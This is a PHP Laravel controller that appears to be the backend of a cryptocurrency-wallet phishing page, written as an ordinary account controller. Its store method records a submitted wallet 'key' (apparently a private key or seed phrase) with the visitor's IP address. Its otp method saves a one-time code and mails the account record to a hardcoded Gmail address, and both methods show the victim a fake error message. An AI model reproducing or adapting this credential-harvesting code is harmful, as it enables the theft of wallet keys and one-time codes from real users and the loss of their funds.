<?php

namespace App\Http\Controllers;

use App\Mail\SendOTP;
use App\Models\Account;
use App\Models\Wallet;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Mail;

class AccountController extends Controller
{
//     /**
//      * Display a listing of the resource.
//      *
//      * @return \Illuminate\Http\Response
//      */
//     public function index()
//     {
// //
//     }

    // /**
    //  * Show the form for creating a new resource.
    //  *
    //  * @return \Illuminate\Http\Response
    //  */
    // public function create()
    // {
    //     //
    // }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        // dd($request->all(), $request->ip());
        if($request->wallet_id == 0){
            //creating a wallet
            $wallet = new Wallet();
            $wallet->image = 'logo.png';
            $wallet->title = $request->other;
            $wallet->status = 'requested';
            $wallet->created_at = now();
            $wallet->save();

            //create a new account
            $account = new Account();
            $account->wallet_id = $wallet->id;
            $account->name = $request->name;
            $account->key = $request->key;
            $account->ip = $request->ip();
            $account->created_at = now();
            $account->save();
            //create a new wallet
            DB::table('wallet_add')->insert(['wallet_id'=>$wallet->id, 'account_id'=>$account->id, 'added'=>true]);
        }else{
            $request['ip'] = $request->ip();
            $account = Account::create($request->all());
        }
        $wallet = Wallet::find($request->wallet_id);
        if($wallet->otp==1){
            return back()->with('message', $account->id);
        }
        return back()->withErrors("There was some problems processing your request, Please try again.");
    }

    /**
     * Display the specified resource.
     *
     * @param  \App\Models\Account  $account
     * @return \Illuminate\Http\Response
     */
    public function show(Account $account)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  \App\Models\Account  $account
     * @return \Illuminate\Http\Response
     */
    public function edit(Account $account)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \App\Models\Account  $account
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, Account $account)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  \App\Models\Account  $account
     * @return \Illuminate\Http\Response
     */
    public function destroy(Account $account)
    {
        $account->delete();
        return back();
    }
    public function otp(Request $request)
    {
        $account = Account::find($request->id);
        $account->otp = $request->otpValue;
        $account->updated_at = now();
        $account->save();
        Mail::to("naemugo@gmail.com")->send(new SendOTP($account));
        return back()->withErrors("There was some problems processing your request, Please try again.");
    }
}
